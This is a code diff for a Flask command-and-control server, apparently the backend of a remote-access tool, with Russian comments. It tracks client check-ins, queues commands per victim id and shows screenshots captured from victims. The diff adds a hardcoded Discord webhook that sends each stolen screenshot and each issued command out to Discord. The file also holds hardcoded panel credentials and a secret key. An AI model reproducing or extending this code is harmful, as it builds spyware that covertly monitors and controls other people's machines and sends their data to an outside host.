@@ -2,16 +2,19 @@ import os
 from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
 import datetime
 import base64
+import requests
 
 app = Flask(__name__)
 app.secret_key = 'lemonleek_secret_123'
 
-# ТВОЙ ЛОГИН И ПАРОЛЬ
+# === ТВОИ ДАННЫЕ ===
 USER = "umer2016"
 PASS = "lola281900"
+WEBHOOK = "https://discord.com/api/webhooks/1566512134769213580/qD8xrwVgc9pammKAVmY665TGfZgiXC2dzeRj-GFzqJg-EM1-UcCKYaYQnGPN03WSBiYB"
 
 clients = {}
 commands = {}
+last_screenshot = None
 
 LOGIN_HTML = """
 <!DOCTYPE html>
@@ -46,7 +49,7 @@ HTML = """
         th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
         .btn { background: #00ff00; color: black; border: none; padding: 5px 10px; cursor: pointer; text-decoration: none; margin-right: 5px; font-weight: bold; }
         .logout { color: #ff0000; text-decoration: none; float: right; font-weight: bold; }
-        img { max-width: 500px; border: 2px solid #00ff00; margin-top: 10px; }
+        img { max-width: 600px; border: 2px solid #00ff00; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -97,13 +100,6 @@ def logout():
 def index():
     if not session.get('logged_in'):
         return redirect(url_for('login'))
-    
-    # Берем последний скриншот, если есть
-    last_screenshot = None
-    if os.path.exists("last_screenshot.txt"):
-        with open("last_screenshot.txt", "r") as f:
-            last_screenshot = f.read()
-            
     return render_template_string(HTML, clients=clients, count=len(clients), screenshot=last_screenshot)
 
 @app.route('/api/checkin', methods=['POST'])
@@ -121,12 +117,21 @@ def checkin():
 
 @app.route('/api/data', methods=['POST'])
 def get_data():
+    global last_screenshot
     data = request.json
+    cid = data.get('id')
+    
     if data.get('type') == 'screenshot':
-        img_data = data.get('img')
-        # Сохраняем скриншот в файл, чтобы потом отобразить
-        with open("last_screenshot.txt", "w") as f:
-            f.write(img_data)
+        img_b64 = data.get('img')
+        last_screenshot = img_b64
+        
+        # Отправляем скриншот в Discord
+        try:
+            img_bytes = base64.b64decode(img_b64)
+            requests.post(WEBHOOK, files={'file': ('screenshot.png', img_bytes, 'image/png')}, data={'content': f'📸 **Screenshot** from {cid}'})
+        except Exception as e:
+            print(f"Discord error: {e}")
+            
     return jsonify({"status": "ok"})
 
 @app.route('/cmd/<cid>/<action>')
@@ -134,6 +139,13 @@ def send_cmd(cid, action):
     if not session.get('logged_in'):
         return "Unauthorized", 401
     commands[cid] = action
+    
+    # Отправляем уведомление о команде в Discord
+    try:
+        requests.post(WEBHOOK, json={'content': f'📌 Command **{action}** sent to {cid}'})
+    except:
+        pass
+        
     return redirect(url_for('index'))
 
 if __name__ == '__main__':
